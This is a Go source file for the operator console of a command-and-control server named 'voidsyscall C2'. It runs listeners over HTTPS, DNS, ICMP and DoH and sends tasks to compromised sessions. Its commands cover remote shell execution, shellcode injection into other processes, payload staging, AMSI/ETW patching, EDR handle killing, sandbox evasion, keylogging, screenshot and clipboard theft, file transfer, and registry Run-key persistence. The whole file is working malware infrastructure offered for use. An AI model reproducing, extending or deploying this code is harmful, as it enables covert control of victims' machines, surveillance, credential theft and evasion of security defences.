package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"github.com/VoidSecSoftwares/voidsyscall/server"
)

var version = "dev"

func parseSessionID(s string) ([16]byte, bool) {
	var id [16]byte
	decoded, err := hex.DecodeString(s)
	if err != nil {
		return id, false
	}
	if len(decoded) > 16 {
		return id, false
	}
	copy(id[:], decoded)
	return id, true
}

func parsePID(s string) (uint32, bool) {
	n, err := strconv.ParseUint(s, 10, 32)
	if err != nil {
		return 0, false
	}
	return uint32(n), true
}

func readShellcode(file string) ([]byte, error) {
	data, err := os.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("read file: %w", err)
	}
	if len(data) > 10*1024*1024 {
		return nil, fmt.Errorf("payload too large")
	}
	return data, nil
}

func printHelp() {
	fmt.Println()
	fmt.Printf("%s%sSession management%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "sessions | ls", server.AnsiReset, "List active sessions")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "kill <id>", server.AnsiReset, "Send task exit to a session")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "tasks <id>", server.AnsiReset, "Show queued + scheduled tasks")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "output <id>", server.AnsiReset, "Show stored task results")
	fmt.Println()
	fmt.Printf("%s%sExecution%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "shell <id> <command>", server.AnsiReset, "Run a shell command on a session")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "inject <id> <pid> <file>", server.AnsiReset, "Inject shellcode into a remote PID")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "stage <id> <payload-file>", server.AnsiReset, "Stage + self-inject a payload")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "ps <id>", server.AnsiReset, "List processes on a session")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "killproc <id> <pid>", server.AnsiReset, "Terminate a process by PID")
	fmt.Println()
	fmt.Printf("%s%ssurveillance%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "shot <id>", server.AnsiReset, "Capture a screenshot to screenshots/<task>.bmp")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "keylog <id> <1|2|3>", server.AnsiReset, "Keylogger: 1=start, 2=stop, 3=dump")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "clipboard <id>", server.AnsiReset, "Read the clipboard unicode text")
	fmt.Println()
	fmt.Printf("%s%sPivoting / files%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "download <id> <remote> <local>", server.AnsiReset, "Pull a file off a session")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "upload <id> <local> <remote>", server.AnsiReset, "Push a file to a session")
	fmt.Println()
	fmt.Printf("%s%sEvasion / operators%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "patch <id> <amsi|etw|both>", server.AnsiReset, "Patch AMSI/ETW on a session")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "evasion <id> <1-8>", server.AnsiReset, "VM/sandbox/debug/timing/hookscan")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "handles <id> <1-4>", server.AnsiReset, "EDR handle enumeration / kill")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "token <id> <1-4>", server.AnsiReset, "Token privilege operations")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "vault <id> <sub>", server.AnsiReset, "Encrypted storage operations")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "fingerprint <id>", server.AnsiReset, "Dump SSN build fingerprint")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "rotate <id>", server.AnsiReset, "Rotate the per-session key")
	fmt.Println()
	fmt.Printf("%s%sPersistence%s\n", server.AnsiBold, server.AnsiCyan, server.AnsiReset)
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "schedule <id> <sec> <command>", server.AnsiReset, "Recurring shell task on a session")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "unschedule <id>", server.AnsiReset, "Clear all schedules")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "persist <id> [name]", server.AnsiReset, "Register agent in the Run key")
	fmt.Println()
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "help", server.AnsiReset, "Show this help")
	fmt.Printf("  %s%-28s%s%s\n", server.AnsiGreen, "exit | quit", server.AnsiReset, "Shut down the server")
	fmt.Println()
}

func main() {
	httpAddr := flag.String("http-addr", "0.0.0.0", "HTTP listen address")
	httpPort := flag.Int("https-port", 443, "HTTPS port")
	dnsAddr := flag.String("dns-addr", "0.0.0.0", "DNS listen address")
	dnsPort := flag.Int("dns-port", 53, "DNS port")
	icmpAddr := flag.String("icmp-addr", "0.0.0.0", "ICMP listen address")
	dohAddr := flag.String("doh-addr", "", "DoH HTTP listen address (empty = disabled)")
	dohURL := flag.String("doh-url", "https://dns.google/resolve", "DoH resolution endpoint")
	beaconPath := flag.String("path", "/api/v2/health", "Beacon endpoint path")
	certFile := flag.String("cert", "", "TLS certificate file")
	keyFile := flag.String("key", "", "TLS key file")
	webAddr := flag.String("web-addr", "", "Operator web UI listen address (empty = disabled)")
	stateFile := flag.String("state", "", "JSON state file for session persistence across restarts")
	flag.Parse()

	cfg := &server.ServerConfig{
		HTTPAddr:   *httpAddr,
		HTTPSPort:  *httpPort,
		DNSAddr:    *dnsAddr,
		DNSPort:    *dnsPort,
		ICMPAddr:   *icmpAddr,
		DoHAddr:    *dohAddr,
		DoHURL:     *dohURL,
		BeaconPath: *beaconPath,
		CertFile:   *certFile,
		KeyFile:    *keyFile,
		WebAddr:    *webAddr,
		StateFile:  *stateFile,
	}

	if *certFile == "" || *keyFile == "" {
		fmt.Fprintln(os.Stderr, "[-] --cert and --key are required")
		os.Exit(1)
	}

	srv := server.NewServer(cfg)

	fmt.Printf("%s%s%s\n", server.AnsiCyan, "╔══════════════════════════════════════════╗", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiCyan, bannerVersionLine(version), server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiGreen, "║  VoidSec Softwares                       ║", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiGreen, "║  HTTPS / DNS / ICMP / DoH                ║", server.AnsiReset)
	fmt.Printf("%s%s%s\n", server.AnsiCyan, "╚══════════════════════════════════════════╝", server.AnsiReset)
	fmt.Println()

	go func() {
		for {
			var input string
			fmt.Print(server.AnsiBold + server.AnsiCyan + "voidsyscall> " + server.AnsiReset)
			fmt.Scanln(&input)
			input = strings.TrimSpace(input)
			if input == "" {
				continue
			}

			parts := strings.SplitN(input, " ", 2)
			cmd := parts[0]
			var args string
			if len(parts) > 1 {
				args = parts[1]
			}

			switch cmd {
			case "sessions", "ls":
				fmt.Println(srv.ListSessions())

			case "help":
				printHelp()

			case "shell":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s shell <session-hex> <command>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				if err := srv.RunShell(sid, parts2[1]); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sTask queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "patch":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s patch <session-hex> <amsi|etw|both>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				var patchType byte
				switch strings.ToLower(parts2[1]) {
				case "amsi":
					patchType = 0x01
				case "etw":
					patchType = 0x02
				case "both":
					patchType = 0x03
				default:
					fmt.Printf("%sUnknown patch type%s\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.PatchTarget(sid, patchType); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sPatch task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "inject":
				parts2 := strings.SplitN(args, " ", 3)
				if len(parts2) < 3 {
					fmt.Printf("%sUsage:%s inject <session-hex> <pid> <shellcode-file>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				pid, ok := parsePID(parts2[1])
				if !ok {
					fmt.Printf("%sInvalid PID%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				shellcode, err := readShellcode(parts2[2])
				if err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
					continue
				}
				if err := srv.RunInject(sid, pid, shellcode); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sInject task queued (%d bytes -> PID %d)%s\n",
						server.AnsiGreen, len(shellcode), pid, server.AnsiReset)
				}

			case "stage":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s stage <session-hex> <payload-file>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				payload, err := readShellcode(parts2[1])
				if err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
					continue
				}
				if err := srv.Stage(sid, payload); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sStaged %d bytes%s\n", server.AnsiGreen, len(payload), server.AnsiReset)
				}

			case "evasion":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s evasion <session-hex> <1-8>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				subNum, ok := parseSmallByte(parts2[1])
				if !ok || subNum < 1 || subNum > 8 {
					fmt.Printf("%sSub-command must be 1-8%s\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunEvasion(sid, subNum); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sEvasion task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "handles":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s handles <session-hex> <1-4>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				subNum, ok := parseSmallByte(parts2[1])
				if !ok || subNum < 1 || subNum > 4 {
					fmt.Printf("%sSub-command must be 1-4%s\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunHandles(sid, subNum); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sHandles task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "token":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s token <session-hex> <1-4>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				subNum, ok := parseSmallByte(parts2[1])
				if !ok || subNum < 1 || subNum > 4 {
					fmt.Printf("%sSub-command must be 1-4%s\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunToken(sid, subNum); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sToken task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "vault":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s vault <session-hex> <sub-command>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				subNum, ok := parseSmallByte(parts2[1])
				if !ok {
					fmt.Printf("%sInvalid sub-command%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				if err := srv.RunVault(sid, subNum); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sVault task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "fingerprint":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s fingerprint <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunFingerprint(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sFingerprint task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "download":
				parts2 := strings.SplitN(args, " ", 3)
				if len(parts2) < 3 {
					fmt.Printf("%sUsage:%s download <session-hex> <remote-path> <local-file>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				if err := srv.RunDownload(sid, parts2[1], parts2[2]); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sDownload queued (remote: %s -> local: %s)%s\n",
						server.AnsiGreen, parts2[1], parts2[2], server.AnsiReset)
				}

			case "upload":
				parts2 := strings.SplitN(args, " ", 3)
				if len(parts2) < 3 {
					fmt.Printf("%sUsage:%s upload <session-hex> <local-file> <remote-path>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				payload, err := os.ReadFile(parts2[1])
				if err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
					continue
				}
				if err := srv.RunUpload(sid, parts2[2], payload); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sUpload queued (%d bytes -> %s)%s\n",
						server.AnsiGreen, len(payload), parts2[2], server.AnsiReset)
				}

			case "ps":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s ps <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunListProcs(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sProcess list requested%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "killproc":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s killproc <session-hex> <pid>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				pid, ok := parsePID(parts2[1])
				if !ok {
					fmt.Printf("%sInvalid PID%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				if err := srv.KillProcess(sid, pid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sTerminate task queued for PID %d%s\n", server.AnsiGreen, pid, server.AnsiReset)
				}

			case "shot":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s shot <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunScreenshot(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sScreenshot task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "keylog":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 2 {
					fmt.Printf("%sUsage:%s keylog <session-hex> <1|2|3>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				sub, ok := parseSmallByte(parts2[1])
				if !ok || sub < 1 || sub > 3 {
					fmt.Printf("%sSub-command must be 1-3%s\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunKeylog(sid, sub); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sKeylog task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "clipboard":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s clipboard <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RunClipboard(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sClipboard task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "persist":
				parts2 := strings.SplitN(args, " ", 2)
				if len(parts2) < 1 {
					fmt.Printf("%sUsage:%s persist <session-hex> [value-name]\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				valueName := ""
				if len(parts2) > 1 {
					valueName = parts2[1]
				}
				if err := srv.RunPersist(sid, valueName); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sPersist task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "kill":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s kill <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.StopSession(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sExit task queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "tasks":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s tasks <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				out, err := srv.ListQueue(sid)
				if err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Print(out)
				}

			case "output":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s output <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				out, err := srv.ListResults(sid)
				if err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Print(out)
				}

			case "rotate":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s rotate <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.RotateKey(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sKey rotation queued%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "schedule":
				parts2 := strings.SplitN(args, " ", 3)
				if len(parts2) < 3 {
					fmt.Printf("%sUsage:%s schedule <session-hex> <interval-sec> <command>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				sid, ok := parseSessionID(parts2[0])
				if !ok {
					fmt.Printf("%sInvalid session hex%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				interval, err := strconv.Atoi(parts2[1])
				if err != nil || interval <= 0 {
					fmt.Printf("%sInvalid interval%s\n", server.AnsiRed, server.AnsiReset)
					continue
				}
				if err := srv.Schedule(sid, interval, parts2[2]); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sScheduled every %ds: %s%s\n", server.AnsiGreen, interval, parts2[2], server.AnsiReset)
				}

			case "unschedule":
				sid, ok := parseSessionID(args)
				if !ok {
					fmt.Printf("%sUsage:%s unschedule <session-hex>\n", server.AnsiYellow, server.AnsiReset)
					continue
				}
				if err := srv.Unschedule(sid); err != nil {
					fmt.Printf("%sError: %v%s\n", server.AnsiRed, err, server.AnsiReset)
				} else {
					fmt.Printf("%sSchedules cleared%s\n", server.AnsiGreen, server.AnsiReset)
				}

			case "exit", "quit":
				fmt.Printf("%sShutting down...%s\n", server.AnsiYellow, server.AnsiReset)
				os.Exit(0)

			default:
				fmt.Printf("%sUnknown command: %s%s\n", server.AnsiRed, cmd, server.AnsiReset)
				fmt.Printf("Type %shelp%s for a list of commands\n", server.AnsiCyan, server.AnsiReset)
			}
		}
	}()

	if err := srv.Run(); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}

func parseSmallByte(s string) (byte, bool) {
	n, err := strconv.Atoi(s)
	if err != nil {
		return 0, false
	}
	return byte(n), true
}

// bannerVersionLine produces the second line of the boxed banner, padded so
// the right wall aligns with the rest of the box regardless of version length.
func bannerVersionLine(ver string) string {
	const interior = 42
	prefix := "       voidsyscall C2 — "
	content := prefix + ver
	pad := interior - len(content)
	if pad < 1 {
		pad = 1
	}
	return "║" + content + strings.Repeat(" ", pad) + "║"
}
